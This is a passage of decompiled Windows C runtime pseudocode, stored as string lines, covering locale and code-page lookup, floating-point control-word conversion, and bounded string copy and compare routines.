    "      && (!sub_180036074(a3 + 64, 95) && !sub_180036074(a3 + 64, 46)",
    "       || sub_18002377C((__int64)(a3 + 144), 7u, a3 + 64, 0x40u)) )",
    "    {",
    "      if ( v11 != 65001 )",
    "      {",
    "        sub_180035034(v11, a3 + 128, 16);",
    "        return 1;",
    "      }",
    "      if ( !(unsigned int)sub_18003110C(a3 + 128, 16, (__int64)L\"utf8\", 5) )",
    "        return 1;",
    "LABEL_38:",
    "      sub_18001A6B4();",
    "      JUMPOUT(0x180031C8DLL);",
    "    }",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall CountryEnumProc(__int64 a1)",
    "{",
    "  __int64 v2; // rbp",
    "  _DWORD *v3; // rdi",
    "  LCID v4; // esi",
    "  int v5; // ebx",
    "  _WORD *i; // rax",
    "  WCHAR LCData[120]; // [rsp+20h] [rbp-108h] BYREF",
    "",
    "  v2 = sub_1800262FC();",
    "  v3 = *(_DWORD **)(sub_1800262FC() + 928);",
    "  v4 = sub_180032230(a1);",
    "  v5 = 0;",
    "  if ( GetLocaleInfoW(v4, *(_DWORD *)(v2 + 180) != 0 ? 7 : 4098, LCData, 120) )",
    "  {",
    "    if ( !(unsigned int)sub_18002C380(*(_QWORD *)(v2 + 160), (__int64)LCData) )",
    "    {",
    "      for ( i = &unk_180042C40; (_WORD)v4 != *i; ++i )",
    "      {",
    "        if ( (unsigned int)++v5 >= 0xA )",
    "        {",
    "          *v3 |= 4u;",
    "          v3[2] = v4;",
    "          v3[1] = v4;",
    "          return (*v3 & 4) == 0;",
    "        }",
    "      }",
    "    }",
    "    return (*v3 & 4) == 0;",
    "  }",
    "  else",
    "  {",
    "    *v3 = 0;",
    "    return 1;",
    "  }",
    "}",
    "",
    "",
    "bool __fastcall sub_180031D78(_DWORD *a1)",
    "{",
    "  __int64 v2; // rax",
    "  __int64 v3; // r8",
    "  __int64 v4; // r9",
    "  __int64 v5; // rdx",
    "  __int64 v6; // rax",
    "  bool v7; // zf",
    "  int v8; // r8d",
    "  __int16 *v9; // rcx",
    "  int i; // r10d",
    "  __int16 v11; // r9",
    "  bool result; // al",
    "",
    "  v2 = sub_1800262FC();",
    "  v3 = -1;",
    "  v4 = -1;",
    "  v5 = v2 + 152;",
    "  v6 = *(_QWORD *)(v2 + 152);",
    "  do",
    "    ++v4;",
    "  while ( *(_WORD *)(v6 + 2 * v4) );",
    "  *(_DWORD *)(v5 + 24) = v4 == 3;",
    "  do",
    "    ++v3;",
    "  while ( *(_WORD *)(*(_QWORD *)(v5 + 8) + 2 * v3) );",
    "  v7 = v3 == 3;",
    "  v8 = 2;",
    "  *(_DWORD *)(v5 + 28) = v7;",
    "  a1[1] = 0;",
    "  if ( !*(_DWORD *)(v5 + 24) )",
    "  {",
    "    v9 = *(__int16 **)v5;",
    "    for ( i = 0; ; ++i )",
    "    {",
    "      v11 = *v9++;",
    "      if ( (unsigned __int16)(v11 - 65) > 0x19u && (unsigned __int16)(v11 - 97) > 0x19u )",
    "        break;",
    "    }",
    "    v8 = i;",
    "  }",
    "  *(_DWORD *)(v5 + 20) = v8;",
    "  EnumSystemLocalesW((LOCALE_ENUMPROCW)sub_180031EE0, 1u);",
    "  result = (*a1 & 0x100) != 0;",
    "  if ( (*a1 & 0x200) == 0 || (*a1 & 7) == 0 || !result )",
    "    *a1 = 0;",
    "  return result;",
    "}",
    "",
    "",
    "BOOL __fastcall sub_180031E48(_DWORD *a1)",
    "{",
    "  __int64 v2; // rax",
    "  __int64 v3; // r8",
    "  __int16 *v4; // rdx",
    "  int v5; // ecx",
    "  int i; // r9d",
    "  __int16 v7; // r8",
    "  BOOL result; // eax",
    "",
    "  v2 = sub_1800262FC();",
    "  v3 = -1;",
    "  v4 = *(__int16 **)(v2 + 152);",
    "  do",
    "    ++v3;",
    "  while ( v4[v3] );",
    "  v5 = 2;",
    "  *(_DWORD *)(v2 + 176) = v3 == 3;",
    "  if ( v3 != 3 )",
    "  {",
    "    for ( i = 0; ; ++i )",
    "    {",
    "      v7 = *v4++;",
    "      if ( (unsigned __int16)(v7 - 65) > 0x19u && (unsigned __int16)(v7 - 97) > 0x19u )",
    "        break;",
    "    }",
    "    v5 = i;",
    "  }",
    "  *(_DWORD *)(v2 + 172) = v5;",
    "  result = EnumSystemLocalesW((LOCALE_ENUMPROCW)LanguageEnumProc, 1u);",
    "  if ( (*(_BYTE *)a1 & 4) == 0 )",
    "    *a1 = 0;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180031EE0(__int64 a1)",
    "{",
    "  _QWORD *v2; // rsi",
    "  int *v3; // rdi",
    "  LCID v4; // ebx",
    "  __int64 v5; // rbp",
    "  int v6; // eax",
    "  int v7; // ecx",
    "  int v8; // ecx",
    "  int v9; // eax",
    "  __int64 v10; // rax",
    "  unsigned int v11; // edx",
    "  _WORD *v12; // rax",
    "  int v13; // eax",
    "  __int64 v14; // rdx",
    "  WCHAR LCData[120]; // [rsp+20h] [rbp-118h] BYREF",
    "",
    "  v2 = (_QWORD *)(sub_1800262FC() + 152);",
    "  v3 = *(int **)(sub_1800262FC() + 928);",
    "  v4 = sub_180032230(a1);",
    "  if ( !GetLocaleInfoW(v4, *((_DWORD *)v2 + 7) != 0 ? 7 : 4098, LCData, 120) )",
    "    goto LABEL_37;",
    "  v5 = -1;",
    "  if ( !(unsigned int)sub_18002C380(v2[1], (__int64)LCData) )",
    "  {",
    "    if ( !GetLocaleInfoW(v4, *((_DWORD *)v2 + 6) != 0 ? 3 : 4097, LCData, 120) )",
    "      goto LABEL_37;",
    "    v6 = sub_18002C380(*v2, (__int64)LCData);",
    "    v7 = *v3;",
    "    if ( v6 )",
    "    {",
    "      if ( (v7 & 2) == 0 )",
    "      {",
    "        if ( !*((_DWORD *)v2 + 5) || (v9 = sub_180032CAC(*v2, LCData, *((int *)v2 + 5)), v7 = *v3, v9) )",
    "        {",
    "          if ( (v7 & 1) == 0 )",
    "          {",
    "            v11 = 0;",
    "            v12 = &unk_180042C40;",
    "            while ( (_WORD)v4 != *v12 )",
    "            {",
    "              ++v11;",
    "              ++v12;",
    "              if ( v11 >= 0xA )",
    "              {",
    "                v8 = v7 | 1;",
    "                goto LABEL_18;",
    "              }",
    "            }",
    "          }",
    "        }",
    "        else",
    "        {",
    "          v3[2] = v4;",
    "          *v3 = v7 | 2;",
    "          v10 = -1;",
    "          do",
    "            ++v10;",
    "          while ( *(_WORD *)(*v2 + 2 * v10) );",
    "          if ( (_DWORD)v10 == *((_DWORD *)v2 + 5) )",
    "            v3[1] = v4;",
    "        }",
    "      }",
    "    }",
    "    else",
    "    {",
    "      v8 = v7 | 0x304;",
    "      v3[1] = v4;",
    "LABEL_18:",
    "      v3[2] = v4;",
    "      *v3 = v8;",
    "    }",
    "  }",
    "  if ( (*v3 & 0x300) == 0x300 )",
    "    return (*v3 & 4) == 0;",
    "  if ( GetLocaleInfoW(v4, *((_DWORD *)v2 + 6) != 0 ? 3 : 4097, LCData, 120) )",
    "  {",
    "    if ( (unsigned int)sub_18002C380(*v2, (__int64)LCData) )",
    "    {",
    "      if ( *((_DWORD *)v2 + 6) || !*((_DWORD *)v2 + 5) || (unsigned int)sub_18002C380(*v2, (__int64)LCData) )",
    "        return (*v3 & 4) == 0;",
    "      v14 = 0;",
    "    }",
    "    else",
    "    {",
    "      v13 = *v3 | 0x200;",
    "      *v3 = v13;",
    "      if ( *((_DWORD *)v2 + 6) || !*((_DWORD *)v2 + 5) )",
    "        goto LABEL_23;",
    "      do",
    "        ++v5;",
    "      while ( *(_WORD *)(*v2 + 2 * v5) );",
    "      if ( (_DWORD)v5 != *((_DWORD *)v2 + 5) )",
    "      {",
    "LABEL_23:",
    "        *v3 = v13 | 0x100;",
    "        goto LABEL_34;",
    "      }",
    "      v14 = 1;",
    "    }",
    "    if ( (unsigned int)sub_180032330(v4, v14, v3) )",
    "    {",
    "      *v3 |= 0x100u;",
    "LABEL_34:",
    "      if ( !v3[1] )",
    "        v3[1] = v4;",
    "    }",
    "    return (*v3 & 4) == 0;",
    "  }",
    "LABEL_37:",
    "  *v3 = 0;",
    "  return 1;",
    "}",
    "",
    "",
    "__int64 __fastcall LanguageEnumProc(__int64 a1)",
    "{",
    "  __int64 v2; // rsi",
    "  _DWORD *v3; // rdi",
    "  LCID v4; // ebx",
    "  int v6; // eax",
    "  int v7; // ecx",
    "  __int64 v8; // rdx",
    "  WCHAR LCData[120]; // [rsp+20h] [rbp-108h] BYREF",
    "",
    "  v2 = sub_1800262FC();",
    "  v3 = *(_DWORD **)(sub_1800262FC() + 928);",
    "  v4 = sub_180032230(a1);",
    "  if ( !GetLocaleInfoW(v4, *(_DWORD *)(v2 + 176) != 0 ? 3 : 4097, LCData, 120) )",
    "  {",
    "    *v3 = 0;",
    "    return 1;",
    "  }",
    "  v6 = sub_18002C380(*(_QWORD *)(v2 + 152), (__int64)LCData);",
    "  v7 = *(_DWORD *)(v2 + 176);",
    "  if ( v6 )",
    "  {",
    "    if ( v7 || !*(_DWORD *)(v2 + 172) || (unsigned int)sub_18002C380(*(_QWORD *)(v2 + 152), (__int64)LCData) )",
    "      return (*v3 & 4) == 0;",
    "    v8 = 0;",
    "  }",
    "  else",
    "  {",
    "    if ( v7 )",
    "    {",
    "LABEL_11:",
    "      *v3 |= 4u;",
    "      v3[1] = v4;",
    "      v3[2] = v4;",
    "      return (*v3 & 4) == 0;",
    "    }",
    "    v8 = 1;",
    "  }",
    "  if ( (unsigned int)sub_180032330(v4, v8, v3) )",
    "    goto LABEL_11;",
    "  return (*v3 & 4) == 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180032230(unsigned __int16 *a1)",
    "{",
    "  unsigned __int16 v1; // dx",
    "  unsigned __int16 *v2; // r8",
    "  unsigned int v3; // r9d",
    "  __int16 v4; // ax",
    "  int v5; // ecx",
    "",
    "  v1 = *a1;",
    "  v2 = a1 + 1;",
    "  v3 = 0;",
    "  while ( v1 )",
    "  {",
    "    if ( (unsigned __int16)(v1 - 97) > 5u )",
    "    {",
    "      if ( (unsigned __int16)(v1 - 65) > 5u )",
    "        goto LABEL_7;",
    "      v4 = -7;",
    "    }",
    "    else",
    "    {",
    "      v4 = -39;",
    "    }",
    "    v1 += v4;",
    "LABEL_7:",
    "    v5 = v1;",
    "    v1 = *v2;",
    "    v3 = v5 + 16 * v3 - 48;",
    "    ++v2;",
    "  }",
    "  return v3;",
    "}",
    "",
    "",
    "UINT __fastcall ProcessCodePage(__int16 *a1, __int64 a2)",
    "{",
    "  UINT result; // eax",
    "  __int64 LCData; // [rsp+30h] [rbp+8h] BYREF",
    "",
    "  if ( a1 && *a1 && (unsigned int)sub_180035054(a1, L\"ACP\") )",
    "  {",
    "    if ( (unsigned int)sub_180035054(a1, L\"OCP\") )",
    "      return sub_180023184(a1);",
    "    if ( GetLocaleInfoW(*(_DWORD *)(a2 + 8), 0x2000000Bu, (LPWSTR)&LCData, 2) )",
    "      return LCData;",
    "    return 0;",
    "  }",
    "  if ( !GetLocaleInfoW(*(_DWORD *)(a2 + 8), 0x20001004u, (LPWSTR)&LCData, 2) )",
    "    return 0;",
    "  result = LCData;",
    "  if ( !(_DWORD)LCData )",
    "    return GetACP();",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180032330(int a1, int a2)",
    "{",
    "  __int64 v4; // rdi",
    "  int LocaleInfoW; // eax",
    "  unsigned int v6; // edx",
    "  __int16 *v7; // r10",
    "  int v8; // r9d",
    "  __int16 v9; // r8",
    "  __int16 *v10; // rcx",
    "  __int64 v11; // rax",
    "  __int64 LCData; // [rsp+30h] [rbp+8h] BYREF",
    "",
    "  v4 = sub_1800262FC();",
    "  LocaleInfoW = GetLocaleInfoW(a1 & 0x3FF | 0x400, 0x20000001u, (LPWSTR)&LCData, 2);",
    "  v6 = 0;",
    "  if ( !LocaleInfoW )",
    "    return 0;",
    "  if ( a1 == (_DWORD)LCData || !a2 )",
    "    return 1;",
    "  v7 = *(__int16 **)(v4 + 152);",
    "  v8 = 0;",
    "  v9 = *v7;",
    "  v10 = v7 + 1;",
    "  while ( (unsigned __int16)(v9 - 65) <= 0x19u || (unsigned __int16)(v9 - 97) <= 0x19u )",
    "  {",
    "    v9 = *v10;",
    "    ++v8;",
    "    ++v10;",
    "  }",
    "  v11 = -1;",
    "  do",
    "    ++v11;",
    "  while ( v7[v11] );",
    "  LOBYTE(v6) = v8 != (_DWORD)v11;",
    "  return v6;",
    "}",
    "",
    "",
    "char __fastcall sub_1800323E4(__int64 a1, int a2, __int64 *a3)",
    "{",
    "  int v3; // edi",
    "  int v5; // ebx",
    "  __int64 v7; // rsi",
    "  int v8; // eax",
    "",
    "  v3 = 0;",
    "  v5 = a2;",
    "  if ( a2 < 0 )",
    "    return 0;",
    "  while ( 1 )",
    "  {",
    "    v7 = (v3 + v5) / 2;",
    "    v8 = sub_18002C380(*a3, *(_QWORD *)(16 * v7 + a1));",
    "    if ( !v8 )",
    "      break;",
    "    if ( v8 >= 0 )",
    "      v3 = v7 + 1;",
    "    else",
    "      v5 = v7 - 1;",
    "    if ( v3 > v5 )",
    "      return 0;",
    "  }",
    "  *a3 = 16 * v7 + a1 + 8;",
    "  return 1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180032464(__int64 a1, UINT *a2, WCHAR *a3)",
    "{",
    "  __int64 v6; // rsi",
    "  _QWORD *v7; // rbx",
    "  _WORD *v8; // rax",
    "  __int64 v9; // rdx",
    "  __int64 v10; // rcx",
    "  UINT v11; // eax",
    "  UINT v12; // ebx",
    "  __int64 Locale; // [rsp+20h] [rbp-20h] BYREF",
    "  LCID UserDefaultLCID; // [rsp+28h] [rbp-18h]",
    "",
    "  v6 = sub_1800262FC();",
    "  Locale = 0;",
    "  UserDefaultLCID = 0;",
    "  v7 = (_QWORD *)(v6 + 160);",
    "  *(_QWORD *)(sub_1800262FC() + 928) = &Locale;",
    "  *(_QWORD *)(v6 + 152) = a1;",
    "  *(_QWORD *)(v6 + 160) = a1 + 128;",
    "  if ( a1 != -128 && *(_WORD *)(a1 + 128) )",
    "    sub_1800323E4((__int64)&off_180042090, 22, (__int64 *)(v6 + 160));",
    "  LODWORD(Locale) = 0;",
    "  v8 = *(_WORD **)(v6 + 152);",
    "  if ( !v8 || !*v8 )",
    "  {",
    "    if ( *v7 && *(_WORD *)*v7 )",
    "    {",
    "      v9 = sub_1800262FC();",
    "      v10 = -1;",
    "      do",
    "        ++v10;",
    "      while ( *(_WORD *)(*(_QWORD *)(v9 + 160) + 2 * v10) );",
    "      *(_DWORD *)(v9 + 180) = v10 == 3;",
    "      EnumSystemLocalesW((LOCALE_ENUMPROCW)CountryEnumProc, 1u);",
    "      if ( (Locale & 4) == 0 )",
    "        LODWORD(Locale) = 0;",
    "    }",
    "    else",
    "    {",
    "      LODWORD(Locale) = 260;",
    "      UserDefaultLCID = GetUserDefaultLCID();",
    "      HIDWORD(Locale) = UserDefaultLCID;",
    "    }",
    "LABEL_23:",
    "    if ( !(_DWORD)Locale )",
    "      return 0;",
    "    goto LABEL_24;",
    "  }",
    "  if ( *v7 && *(_WORD *)*v7 )",
    "    sub_180031D78(&Locale);",
    "  else",
    "    sub_180031E48(&Locale);",
    "  if ( !(_DWORD)Locale )",
    "  {",
    "    if ( sub_1800323E4((__int64)&off_180041C70, 64, (__int64 *)(v6 + 152)) )",
    "    {",
    "      if ( *v7 && *(_WORD *)*v7 )",
    "        sub_180031D78(&Locale);",
    "      else",
    "        sub_180031E48(&Locale);",
    "    }",
    "    goto LABEL_23;",
    "  }",
    "LABEL_24:",
    "  v11 = ProcessCodePage((__int16 *)((a1 + 256) & -(__int64)(a1 != 0)), (__int64)&Locale);",
    "  v12 = v11;",
    "  if ( v11 && IsValidCodePage((unsigned __int16)v11) && IsValidLocale(HIDWORD(Locale), 1u) )",
    "  {",
    "    if ( a2 )",
    "      *a2 = v12;",
    "    sub_18002394C(HIDWORD(Locale), v6 + 752, 0x55u, 0);",
    "    if ( !a3 )",
    "      return 1;",
    "    sub_18002394C(HIDWORD(Locale), (__int64)(a3 + 144), 0x55u, 0);",
    "    if ( GetLocaleInfoW(HIDWORD(Locale), 0x1001u, a3, 64) && GetLocaleInfoW(UserDefaultLCID, 0x1002u, a3 + 64, 64) )",
    "    {",
    "      sub_180035034(v12, a3 + 128, 16);",
    "      return 1;",
    "    }",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "// attributes: thunk",
    "BOOL __stdcall GetStringTypeW(DWORD dwInfoType, LPCWCH lpSrcStr, int cchSrc, LPWORD lpCharType)",
    "{",
    "}__int64 sub_1800326F8()",
    "{",
    "  unsigned int v0; // r9d",
    "  __int16 v1; // ax",
    "  int v2; // r8d",
    "  int v3; // eax",
    "  int v4; // ecx",
    "  unsigned int v5; // edx",
    "",
    "  v0 = _mm_getcsr();",
    "  v1 = v0 & 0x8040;",
    "  if ( (v0 & 0x8040) == 0x8000 )",
    "  {",
    "    v2 = 3072;",
    "  }",
    "  else if ( v1 == 64 )",
    "  {",
    "    v2 = 2048;",
    "  }",
    "  else",
    "  {",
    "    v2 = 0;",
    "    if ( v1 == -32704 )",
    "      v2 = 1024;",
    "  }",
    "  v3 = v0 & 0x6000;",
    "  if ( (v0 & 0x6000) != 0 )",
    "  {",
    "    if ( v3 == 0x2000 )",
    "    {",
    "      v4 = 256;",
    "    }",
    "    else if ( v3 == 0x4000 )",
    "    {",
    "      v4 = 512;",
    "    }",
    "    else",
    "    {",
    "      v4 = 768;",
    "      if ( v3 != 24576 )",
    "        v4 = 0;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v4 = 0;",
    "  }",
    "  v5 = v4",
    "     | v2",
    "     | ((v0 & 0x180 | ((v0 & 0x200 | ((v0 & 0x400 | ((v0 & 0x800 | (v0 >> 2) & 0x400) >> 2)) >> 2)) >> 3)) >> 3);",
    "  return v5 | (((4 * v5) | v5 & 0xFFFFFF00) << 22);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180032834(unsigned int a1)",
    "{",
    "  int v1; // edx",
    "  __int16 v2; // di",
    "  __int16 v3; // r11",
    "  int v4; // ecx",
    "  __int16 v5; // r9",
    "  __int16 v6; // bx",
    "  __int16 v7; // r10",
    "  int v8; // eax",
    "  __int16 v9; // r8",
    "  __int16 v10; // cx",
    "  __int16 v11; // cx",
    "  __int16 v12; // cx",
    "  __int16 v13; // cx",
    "  __int16 v14; // ax",
    "  __int16 v15; // cx",
    "  int v16; // et0",
    "  int v17; // ecx",
    "  __int64 result; // rax",
    "",
    "  v1 = (a1 >> 22) & 0x300 | HIBYTE(a1) & 0x3F;",
    "  v2 = 1024;",
    "  v3 = 2048;",
    "  v4 = a1 & 0xC00;",
    "  switch ( v4 )",
    "  {",
    "    case 1024:",
    "      v5 = -32704;",
    "      break;",
    "    case 2048:",
    "      v5 = 64;",
    "      break;",
    "    case 3072:",
    "      v5 = 0x8000;",
    "      break;",
    "    default:",
    "      v5 = 0;",
    "      break;",
    "  }",
    "  v6 = 256;",
    "  v7 = 512;",
    "  v8 = v1 & 0x300;",
    "  if ( (v1 & 0x300) != 0 )",
    "  {",
    "    switch ( v8 )",
    "    {",
    "      case 256:",
    "        v9 = 0x2000;",
    "        goto LABEL_16;",
    "      case 512:",
    "        v9 = 0x4000;",
    "        goto LABEL_16;",
    "      case 768:",
    "        v9 = 24576;",
    "        goto LABEL_16;",
    "    }",
    "  }",
    "  v9 = 0;",
    "LABEL_16:",
    "  if ( (v1 & 1) != 0 )",
    "    v10 = 4096;",
    "  else",
    "    v10 = 0;",
    "  if ( (v1 & 2) == 0 )",
    "    v3 = 0;",
    "  v11 = v3 | v10;",
    "  if ( (v1 & 4) == 0 )",
    "    v2 = 0;",
    "  v12 = v2 | v11;",
    "  if ( (v1 & 8) == 0 )",
    "    v7 = 0;",
    "  v13 = v7 | v12;",
    "  if ( (v1 & 0x10) != 0 )",
    "    v14 = 128;",
    "  else",
    "    v14 = 0;",
    "  v15 = v14 | v13;",
    "  if ( (v1 & 0x20) == 0 )",
    "    v6 = 0;",
    "  v16 = _mm_getcsr();",
    "  v17 = ((unsigned __int16)v5 | (unsigned __int16)(v6 | v15 | v9)) & 0xFFC0;",
    "  result = v17 | v16 & 0xFFFF003F;",
    "  _mm_setcsr(v17 | v16 & 0xFFFF003F);",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800329E0(unsigned __int16 a1)",
    "{",
    "  unsigned __int16 Buffer; // [rsp+30h] [rbp+8h] BYREF",
    "  int NumberOfCharsWritten; // [rsp+38h] [rbp+10h] BYREF",
    "",
    "  Buffer = a1;",
    "  if ( (unsigned int)sub_18003508C() && (unsigned int)sub_1800350FC(&Buffer, (PCONTEXT)1, &NumberOfCharsWritten) )",
    "    return Buffer;",
    "  else",
    "    return 0xFFFF;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180032A1C(char *a1, unsigned __int16 **a2, unsigned __int64 a3, __int64 a4, __int64 a5)",
    "{",
    "  __int64 v5; // rax",
    "  __int64 v6; // r14",
    "  unsigned __int16 *v7; // rsi",
    "  char *v11; // rbx",
    "  unsigned __int16 *v12; // rdi",
    "  char *v13; // r12",
    "  unsigned __int64 v14; // rax",
    "  unsigned __int64 v15; // r14",
    "  char *v16; // rax",
    "  bool v17; // zf",
    "  __int64 result; // rax",
    "  __int64 v19; // rbx",
    "  __int64 v20; // [rsp+28h] [rbp-50h]",
    "  char v21[8]; // [rsp+30h] [rbp-48h] BYREF",
    "",
    "  v5 = a5;",
    "  v6 = a4;",
    "  v7 = *a2;",
    "  v20 = a4;",
    "  if ( a1 )",
    "  {",
    "    v11 = a1;",
    "    v12 = v7;",
    "    while ( 1 )",
    "    {",
    "      v13 = v21;",
    "      if ( a3 >= 4 )",
    "        v13 = v11;",
    "      v14 = sub_1800351BC(v13, *v7, v6, v5);",
    "      v15 = v14;",
    "      if ( v14 == -1 )",
    "        break;",
    "      if ( v13 != v11 )",
    "      {",
    "        if ( a3 < v14 )",
    "          goto LABEL_12;",
    "        sub_180036160(v11, v13, v14);",
    "      }",
    "      if ( v15 )",
    "      {",
    "        v16 = &v11[v15];",
    "        v17 = v11[v15 - 1] == 0;",
    "        v11 += v15;",
    "        if ( v17 )",
    "        {",
    "          v12 = 0;",
    "          v11 = v16 - 1;",
    "LABEL_12:",
    "          *a2 = v12;",
    "          return v11 - a1;",
    "        }",
    "      }",
    "      v5 = a5;",
    "      ++v7;",
    "      if ( v15 )",
    "        v12 = v7;",
    "      a3 -= v15;",
    "      v6 = v20;",
    "    }",
    "    *a2 = v12;",
    "    return -1;",
    "  }",
    "  else",
    "  {",
    "    v19 = 0;",
    "    result = sub_1800351BC(v21, *v7, a4, a5);",
    "    if ( result != -1 )",
    "    {",
    "      while ( !result || v21[result - 1] )",
    "      {",
    "        ++v7;",
    "        v19 += result;",
    "        result = sub_1800351BC(v21, *v7, v6, a5);",
    "        if ( result == -1 )",
    "          return result;",
    "      }",
    "      return v19 + result - 1;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180032B70(_BYTE *a1, __int64 a2, __int64 a3, __int64 a4)",
    "{",
    "  unsigned int v4; // r10d",
    "  _DWORD *v6; // rax",
    "  unsigned int v7; // ebx",
    "  __int64 v9; // rbx",
    "  _BYTE *v10; // rdx",
    "  __int64 v11; // r8",
    "  __int64 v12; // rdi",
    "  char v13; // al",
    "  char v14; // al",
    "  __int64 v15; // rsi",
    "  __int64 v16; // rax",
    "",
    "  v4 = 0;",
    "  if ( a4 )",
    "  {",
    "    if ( !a1 )",
    "      goto LABEL_4;",
    "  }",
    "  else if ( !a1 )",
    "  {",
    "    if ( !a2 )",
    "      return v4;",
    "    goto LABEL_4;",
    "  }",
    "  if ( !a2 )",
    "  {",
    "LABEL_4:",
    "    v6 = sub_18001A80C();",
    "    v7 = 22;",
    "LABEL_5:",
    "    *v6 = v7;",
    "    invalid_parameter_noinfo();",
    "    return v7;",
    "  }",
    "  if ( !a4 )",
    "  {",
    "    *a1 = 0;",
    "    return v4;",
    "  }",
    "  if ( !a3 )",
    "  {",
    "    *a1 = 0;",
    "    goto LABEL_4;",
    "  }",
    "  v9 = a3 - (_QWORD)a1;",
    "  v10 = a1;",
    "  v11 = a2;",
    "  v12 = a4;",
    "  if ( a4 == -1 )",
    "  {",
    "    while ( 1 )",
    "    {",
    "      v13 = v10[v9];",
    "      *v10++ = v13;",
    "      if ( !v13 )",
    "        break;",
    "      if ( !--v11 )",
    "        goto LABEL_24;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    while ( 1 )",
    "    {",
    "      v14 = v10[v9];",
    "      v15 = v12;",
    "      *v10++ = v14;",
    "      if ( !v14 )",
    "        break;",
    "      if ( --v11 )",
    "      {",
    "        if ( --v12 )",
    "          continue;",
    "      }",
    "      v16 = v15 - 1;",
    "      if ( !v11 )",
    "        v16 = v15;",
    "      if ( !v16 )",
    "        *v10 = 0;",
    "LABEL_24:",
    "      if ( v11 )",
    "        return v4;",
    "      if ( a4 == -1 )",
    "      {",
    "        a1[a2 - 1] = 0;",
    "        return 80;",
    "      }",
    "      *a1 = 0;",
    "      v6 = sub_18001A80C();",
    "      v7 = 34;",
    "      goto LABEL_5;",
    "    }",
    "  }",
    "  return v4;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180032C60(unsigned __int16 *a1, unsigned __int16 *a2, __int64 a3)",
    "{",
    "  __int64 result; // rax",
    "  int v6; // ecx",
    "  int v7; // edx",
    "  int v8; // r9d",
    "  int v9; // ecx",
    "",
    "  if ( !a3 )",
    "    return 0;",
    "  do",
    "  {",
    "    v6 = *a1++;",
    "    v7 = *a2++;",
    "    v8 = v6 + 32;",
    "    if ( (unsigned int)(v6 - 65) > 0x19 )",
    "      v8 = v6;",
    "    v9 = v7 + 32;",
    "    if ( (unsigned int)(v7 - 65) > 0x19 )",
    "      v9 = v7;",
    "    result = (unsigned int)(v8 - v9);",
    "    if ( (_DWORD)result )",
    "      break;",
    "    if ( !v8 )",
    "      break;",
    "    --a3;",
    "  }",
    "  while ( a3 );",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180032CAC(unsigned __int16 *a1, unsigned __int16 *a2, __int64 a3)",
    "{",
    "  if ( dword_18004DC98 )",
    "    return sub_180032CF4(a1, a2, a3, 0);",
    "  if ( a1 && a2 )",
    "    return sub_180032C60(a1, a2, a3);",
    "  *(_DWORD *)sub_18001A80C() = 22;",
    "  invalid_parameter_noinfo();",
    "  return 0x7FFFFFFF;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180032CF4(unsigned __int16 *a1, unsigned __int16 *a2, __int64 a3, __int128 *a4)",
    "{",
    "  __int64 v4; // rbp",
    "  unsigned __int16 *v5; // rsi",
    "  unsigned __int16 *v6; // rbx",
    "  __int64 v8; // rdx",
    "  unsigned int v9; // edi",
    "  __int64 v10; // rcx",
    "  unsigned __int16 v11; // ax",
    "  __int64 v12; // rcx",
    "  int v13; // r14d",
    "  int v14; // edi",
    "  unsigned __int16 v15; // ax",
    "  __int64 v16; // [rsp+20h] [rbp-38h] BYREF",
    "  _QWORD v17[2]; // [rsp+28h] [rbp-30h] BYREF",
    "  char v18; // [rsp+38h] [rbp-20h]",
    "",
    "  v4 = a3;",
    "  v5 = a2;",
    "  v6 = a1;",
    "  if ( a1 && a2 )",
    "  {",
    "    if ( a3 )",
    "    {",
    "      sub_18001B674(&v16, a4);",
    "      v8 = v17[0];",
    "      if ( *(_QWORD *)(v17[0] + 312LL) )",
    "      {",
    "        do",
    "        {",
    "          v10 = *v6++;",
    "          if ( (unsigned __int16)v10 >= 0x100u )",
    "          {",
    "            v11 = sub_180033AE4(v10, v17);",
    "            v8 = v17[0];",
    "          }",
    "          else",
    "          {",
    "            if ( (*((_BYTE *)&unk_18003D120 + 2 * (unsigned __int8)v10 + 2) & 1) != 0 )",
    "              LOBYTE(v10) = *(_BYTE *)((unsigned __int8)v10 + *(_QWORD *)(v8 + 272));",
    "            v11 = (unsigned __int8)v10;",
    "          }",
    "          v12 = *v5++;",
    "          v13 = v11;",
    "          v14 = v11;",
    "          if ( (unsigned __int16)v12 >= 0x100u )",
    "          {",
    "            v15 = sub_180033AE4(v12, v17);",
    "            v8 = v17[0];",
    "          }",
    "          else",
    "          {",
    "            if ( (*((_BYTE *)&unk_18003D120 + 2 * (unsigned __int8)v12 + 2) & 1) != 0 )",
    "              LOBYTE(v12) = *(_BYTE *)((unsigned __int8)v12 + *(_QWORD *)(v8 + 272));",
    "            v15 = (unsigned __int8)v12;",
    "          }",
    "          v9 = v14 - v15;",
    "          if ( v9 )",
    "            break;",
    "          if ( !v13 )",
    "            break;",
    "          --v4;",
    "        }",
    "        while ( v4 );",
    "      }",
    "      else",
    "      {",
    "        v9 = sub_180032C60(v6, v5, v4);",
    "      }",
    "      if ( v18 )",
    "        *(_DWORD *)(v16 + 936) &= ~2u;",
    "      return v9;",
    "    }",
    "    else",
    "    {",
    "      return 0;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "    return 0x7FFFFFFF;",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180032E94(__int64 a1, __int64 a2, unsigned __int64 a3)",
    "{",
    "  if ( dword_18004DC98 )",
    "    return sub_180032EE4(a1, a2, a3, 0);",
    "  if ( a1 && a2 && a3 <= 0x7FFFFFFF )",
    "    JUMPOUT(0x180032E48LL);",
    "  *(_DWORD *)sub_18001A80C() = 22;",
    "  invalid_parameter_noinfo();",
    "  return 0x7FFFFFFF;",
    "}",
    "",
    "",
